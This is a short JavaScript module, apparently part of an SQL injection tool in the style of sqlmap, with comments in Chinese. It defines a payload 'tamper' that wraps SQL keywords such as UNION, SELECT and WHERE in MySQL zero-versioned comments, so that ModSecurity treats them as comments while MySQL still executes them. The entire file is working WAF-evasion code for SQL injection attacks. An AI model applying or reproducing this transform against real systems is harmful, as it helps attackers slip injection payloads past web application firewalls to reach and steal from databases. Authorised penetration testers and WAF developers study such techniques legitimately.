// ModSecurity 绕过：用 /*!00000 KEYWORD */ 包裹（版本号 0，MySQL 忽略版本仍执行，WAF 按注释剥离）
const KW = 'AND|OR|UNION|SELECT|FROM|WHERE|ORDER|BY|HAVING|LIMIT|GROUP';
const RE = new RegExp(`\\b(${KW})\\b`, 'gi');

export const modsecurityzeroversioned = {
  name: 'modsecurityzeroversioned',
  description: '用 /*!00000 KEYWORD */ 包裹关键字（MySQL 忽略版本仍执行），绕过 ModSecurity',
  dbms: ['MySQL'], // [P1-FIX] 方言限定：异构库下无效，运行时告警
  transform(payload) {
    return payload.replace(RE, '/*!00000 $1 */');
  },
};

export default modsecurityzeroversioned;
